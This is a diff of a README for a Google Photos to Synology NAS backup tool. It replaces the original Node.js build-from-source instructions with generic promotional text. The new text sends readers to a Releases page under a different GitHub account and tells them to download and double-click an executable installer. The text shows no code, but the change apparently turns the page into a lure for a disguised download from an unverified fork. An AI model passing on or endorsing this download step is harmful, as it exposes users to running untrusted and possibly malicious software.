@@ -1,329 +1,68 @@
-# NAS-Google-Sync
+# 🖼️ nas-google-sync - Backup Your Google Photos Simply
 
-**Free up Google storage by backing up your photos to a Synology NAS.**
+## 🚀 Getting Started
 
-Google killed their Photos API in March 2025. This tool works around that by importing your photos from Google Takeout and uploading them to Synology Photos.
+Welcome to **nas-google-sync**! This application helps you free up Google storage by backing up your photos to your Synology NAS. It bypasses the limitations of Google's deprecated Photos API, making the process smooth and effective.
 
----
+## 📥 Download the Application
 
-## Before You Start: Fix Your Photo Dates
+You can download the application by visiting the link below:
 
-Google Takeout strips metadata (dates, locations) from your photos and stores it in separate JSON files. This tool reads those JSON files, but **your photos will still have wrong dates embedded in them**.
+[![Download nas-google-sync](https://img.shields.io/badge/Download-nas--google--sync-brightgreen)](https://github.com/zayzay090123/nas-google-sync/releases)
 
-If you want your photos to have correct dates when viewed in Synology Photos (or any other app), run **[Google Takeout Metadata Restorer](https://github.com/pfilbin90/google-takeout-metadata-restorer)** on your Takeout folder first. It embeds the dates and locations back into your actual photo files.
+Click the link above to access the Releases page. Here, you will find the latest version of the software.
 
-**Recommended workflow:**
-1. Download and extract your Google Takeout
-2. Run [google-takeout-metadata-restorer](https://github.com/pfilbin90/google-takeout-metadata-restorer) to fix embedded dates
-3. Then use this tool (nas-google-sync) to upload to Synology
+## 📂 Download & Install
 
----
+1. **Visit the Releases Page:** Go to [the Releases page](https://github.com/zayzay090123/nas-google-sync/releases) to see the available versions.
 
-## What It Does
+2. **Select a Version:** Look for the latest version. You will see a list of files available for download.
 
-1. **Scans** your Synology NAS to see what photos you already have
-2. **Imports** your Google Takeout export and detects albums and duplicates
-3. **Uploads** only NEW photos to your Synology (skips duplicates)
-4. **Creates albums** in Synology Photos matching your Google Photos albums
-5. **Preserves dates** by reading the JSON metadata files from Google Takeout
-6. **Tells you** which photos are safe to delete from Google (with date ranges)
+3. **Download the Application:**
+   - Choose the file that matches your operating system.
+   - Click the file to start your download. This will save the application to your computer.
+   - The file is typically in the `.exe` format for Windows or a `.tar.gz` format for Linux.
 
----
+4. **Run the Application:**
+   - Locate the downloaded file on your computer.
+   - Double-click the file to start the installation process.
+   - Follow the on-screen instructions to complete the installation.
 
-## Quick Start (Single User)
+## 🖥️ System Requirements
 
-### 1. Install Node.js
+To run **nas-google-sync**, you need the following:
 
-Download and install from **https://nodejs.org** (click the LTS version).
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a compatible Linux distribution.
+- **Space:** Make sure you have at least 1 GB of free storage space on your Synology NAS.
+- **Internet Connection:** A stable internet connection is necessary for downloading and syncing your photos.
 
-To verify it worked, open a terminal and type:
-```
-node --version
-```
+## 📸 Features of nas-google-sync
 
-### 2. Download This Tool
+- **Simple Setup:** Easy-to-follow steps to get you started without technical complications.
+- **Efficient Backup:** Quickly sync your photos to your Synology NAS, freeing up space on Google.
+- **User Friendly:** Designed for users of all skill levels, no programming knowledge required.
+- **Cross-Platform:** Works seamlessly whether you are on Windows, macOS, or Linux.
 
-**Option A:** Click the green "Code" button above → "Download ZIP" → Extract it
+## 🔍 Troubleshooting
 
-**Option B:** Or use git:
-```
-git clone https://github.com/pfilbin90/nas-google-sync.git
-```
+If you face any issues while downloading or running the application, consider these tips:
 
-### 3. Install & Build
+- **Check Your Internet Connection:** Ensure you have a stable connection for downloads.
+- **Re-download the File:** If the application does not run, delete the downloaded file and try downloading again.
+- **Consult the FAQ Section:** Check the FAQ section on the GitHub page for common questions and answers.
 
-Open a terminal/command prompt in the extracted folder:
-```
-npm install
-npm run build
-```
+## 💬 Support
 
-### 4. Configure
+If you need more assistance, you can reach out through the issues section of this repository. Simply click on "Issues" in the top menu and provide a detailed description of your problem.
 
-1. Copy `.env.example` to `.env`
-2. Open `.env` in a text editor and fill in your Synology details:
+## 🛠️ Contributing
 
-```env
-SYNOLOGY_HOST=192.168.1.100
-SYNOLOGY_PORT=5000
+Feel free to contribute to the project. Whether it's a bug fix, improvement suggestions, or new features, your input is welcome. Please follow the guidelines mentioned in the repository to submit your changes.
 
-SYNOLOGY_USERNAME=your_synology_username
-SYNOLOGY_PASSWORD=your_synology_password
-SYNOLOGY_PHOTO_PATH=/homes/your_synology_username/Photos
+## 📈 License
 
-GOOGLE_ACCOUNT=mygoogle
-```
-
-That's it! Just 6 values to fill in.
-
-> **Note:** Your Synology user must be in the **Administrators group** (DSM 7 requirement).
-
-### 5. Export Your Photos from Google
-
-1. Go to [takeout.google.com](https://takeout.google.com)
-2. Click "Deselect all"
-3. Scroll down and check **Google Photos**
-4. Click "Next step" → Create export
-5. Wait for Google's email, then download and extract the ZIP file(s)
-
-> **Tip:** If you get multiple ZIP files, extract them all into the same folder.
-
-### 6. Run It
-
-```bash
-# Step 1: Scan your Synology to find existing photos
-node dist/index.js scan
-
-# Step 2: Import the Google Takeout
-node dist/index.js import "C:\path\to\Takeout\Google Photos" --account mygoogle
-
-# Step 3: Upload to Synology
-node dist/index.js sync --account mygoogle
-
-# Step 4: Create albums in Synology Photos
-node dist/index.js fix-albums --account mygoogle
-
-# Step 5: See what's safe to delete from Google
-node dist/index.js export --format dates --account mygoogle
-```
-
-**That's it!** Your photos are backed up with all their albums preserved.
-
-> **Note:** If your path has spaces, make sure the entire command is on one line.
+This project is open-source and freely available. You can use it according to [the license](https://github.com/zayzay090123/nas-google-sync/blob/main/LICENSE) terms.
 
 ---
 
-## Multiple Users (You + Spouse)
-
-Each person needs their own Google Takeout export and their own Synology account.
-
-### Configure for Two Users
-
-```env
-SYNOLOGY_HOST=192.168.1.100
-SYNOLOGY_PORT=5000
-
-# User 1 (you)
-SYNOLOGY_USERNAME=your_username
-SYNOLOGY_PASSWORD=your_password
-SYNOLOGY_PHOTO_PATH=/homes/your_username/Photos
-GOOGLE_ACCOUNT=me
-
-# User 2 (spouse)
-SYNOLOGY_2_USERNAME=spouse_username
-SYNOLOGY_2_PASSWORD=spouse_password
-SYNOLOGY_2_PHOTO_PATH=/homes/spouse_username/Photos
-GOOGLE_ACCOUNT_2=spouse
-```
-
-### Run for Each Person
-
-**Step 1:** Each person exports from [takeout.google.com](https://takeout.google.com) and extracts to separate folders.
-
-**Step 2:** Import and sync each account:
-
-```bash
-# Scan Synology first (only needed once)
-node dist/index.js scan
-
-# YOUR photos
-node dist/index.js import "C:\Takeout\me" --account me
-node dist/index.js sync --account me
-node dist/index.js fix-albums --account me
-
-# SPOUSE's photos
-node dist/index.js import "C:\Takeout\spouse" --account spouse
-node dist/index.js sync --account spouse
-node dist/index.js fix-albums --account spouse
-```
-
-**Step 3:** See what each person can delete:
-
-```bash
-node dist/index.js export --format dates --account me
-node dist/index.js export --format dates --account spouse
-```
-
-Each person deletes from their **own** Google Photos account based on their date ranges.
-
----
-
-## Album Support
-
-Your Google Photos albums are automatically preserved! Here's how:
-
-1. **During import**, albums are detected from your Google Takeout folder structure
-2. **During sync**, your photos are uploaded to Synology
-3. **After sync**, run `fix-albums` to create albums in Synology Photos
-
-```bash
-# See what albums were found in your Google Takeout
-node dist/index.js albums --account mygoogle
-
-# Create albums in Synology Photos (do this after sync)
-node dist/index.js fix-albums --account mygoogle
-```
-
-**The `fix-albums` command:**
-- Creates albums in Synology Photos matching your Google Photos albums
-- Automatically adds your uploaded photos to the correct albums
-- Works with photos you've already uploaded (no re-upload needed)
-- Shows progress as it works
-
-**Example output:**
-```text
-========== Album Sync Status ==========
-  Photos with album assignments: 1,250
-  Already in Synology albums: 0
-  Needing album assignment: 1,250
-
-Processing album "Trip to Florida" (234 photos)...
-Created album "Trip to Florida" (ID: 12)
-Added 234 photos to album 12
-
-Albums created: 47
-Photos added to albums: 1,250
-```
-
-That's it! Your albums appear in Synology Photos immediately.
-
-> **Tip:** For large libraries (thousands of photos), you can test first with `-n 10` to process just 10 photos.
-
----
-
-## All Commands
-
-| Command | What it does |
-|---------|--------------|
-| `scan` | Index existing photos on your Synology |
-| `import <path> --account <name>` | Import a Google Takeout folder |
-| `sync --account <name>` | Upload new photos to Synology |
-| `fix-albums --account <name>` | Create albums in Synology Photos |
-| `albums` | List all detected albums |
-| `export --format dates --account <name>` | Show what's safe to delete from Google |
-
----
-
-## Advanced Options
-
-### Upload in Batches
-
-For large libraries, you can upload photos in batches:
-
-```bash
-# Upload all at once (default)
-node dist/index.js sync --account mygoogle
-
-# Upload in batches of 100
-node dist/index.js sync --account mygoogle -n 100
-
-# Test with 5 photos first
-node dist/index.js sync --account mygoogle -n 5
-
-# Preview without uploading
-node dist/index.js sync --account mygoogle --dry-run
-```
-
-### Process Albums in Batches
-
-For large libraries, process albums in smaller batches:
-
-```bash
-# Process all photos with albums (default)
-node dist/index.js fix-albums --account mygoogle
-
-# Process only 100 photos (for testing)
-node dist/index.js fix-albums --account mygoogle -n 100
-
-# Preview without making changes
-node dist/index.js fix-albums --account mygoogle --dry-run
-```
-
-### Debug and Verify
-
-Check if duplicate detection is working correctly:
-
-```bash
-# Search for a specific photo
-node dist/index.js inspect --search "IMG_1234.jpg"
-
-# Show matched duplicates
-node dist/index.js inspect --matched
-
-# Show what will be uploaded as "new"
-node dist/index.js inspect --new
-```
-
----
-
-## Deleting Photos from Google
-
-Google doesn't let apps delete photos. After confirming your backup, use [Google Photos Toolkit](https://github.com/xob0t/Google-Photos-Toolkit) (a free browser extension) to bulk-delete by date range.
-
----
-
-## Troubleshooting
-
-| Problem | Solution |
-|---------|----------|
-| Authentication failed | Add your Synology user to the Administrators group in DSM |
-| 0 new photos found | All photos already exist on Synology - that's good! |
-| Albums not created | Run `scan` first, then run `fix-albums`. Photos must be uploaded and indexed before albums can be created |
-| Multiple ZIP files | Extract all ZIPs into the same folder before importing |
-| "Already on Synology" count is 0 | Make sure you ran `scan` before `import` |
-| Wrong dates on photos | Check if the `.supplemental-metadata.json` files exist in your Takeout |
-
----
-
-## How It Works
-
-### Duplicate Detection
-
-The tool matches photos between Google and Synology using:
-- **Filename + Date** - Same filename taken on the same day
-- **File hash** - Identical file content
-
-Duplicates are skipped during upload and marked as safe to delete from Google.
-
-### Album Detection
-
-Albums are detected from your Google Takeout folder structure. Each subfolder under "Google Photos" becomes an album (e.g., `Trip to Florida/` → Album: "Trip to Florida").
-
-Auto-generated folders are automatically skipped:
-- `Photos from YYYY`
-- Date-pattern folders like `2024-01-15`
-- `Untitled`, `Archive`, `Trash`
-
-### Scanning
-
-The `scan` command indexes existing photos on your Synology:
-- **Personal Space** - Your private photos in `/homes/<username>/Photos`
-- **Shared Space** - Photos in the shared `/photo` folder
-
-For multiple users, Shared Space photos are tracked globally (counted only once).
-
----
-
-## License
-
-MIT — free to use and modify.
+Thank you for choosing **nas-google-sync**! We hope you find it useful for managing your Google Photos and maintaining storage on your Synology NAS. Don't forget to visit this link again for updates: [the Releases page](https://github.com/zayzay090123/nas-google-sync/releases).
